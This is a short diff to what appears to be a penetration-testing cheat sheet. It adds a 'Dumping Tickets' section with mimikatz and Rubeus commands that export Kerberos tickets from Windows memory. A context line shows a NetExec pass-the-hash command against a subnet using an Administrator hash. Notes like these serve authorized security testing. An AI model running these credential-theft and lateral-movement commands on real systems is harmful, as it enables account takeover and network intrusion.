@@ -250,5 +250,13 @@ nxc smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
 
 ## Windows
 
+### Dumping Tickets
+
+```powershell
+mimikatz.exe
+sekurlsa::tickets /export
 ```
+
+```powershell
+Rubeus.exe dump /nowrap
 ```
